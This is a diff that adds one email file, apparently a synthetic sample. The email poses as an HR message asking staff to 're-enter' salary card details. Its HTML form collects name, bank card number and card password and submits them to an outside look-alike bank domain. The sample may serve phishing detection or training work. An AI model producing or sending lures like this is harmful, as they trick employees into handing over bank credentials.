@@ -1,0 +1,9 @@
+From: =?utf-8?B?5Lq66LWE57O757uf?= <ehr@hr-saas.example>
+To: staff@corp.internal
+Date: Tue, 25 Aug 2026 10:39:00 +0800
+Message-ID: <0019-b2@synth.example>
+Subject: 信息采集（薪资卡维护）
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>因银行渠道升级，请补录薪资卡信息：</p><form action='https://ehr-bank.example.net/save'><input name='name' placeholder='姓名'><input name='card' placeholder='银行卡号'><input type='password' name='pwd' placeholder='查询密码'><button>提交</button></form></body></html>
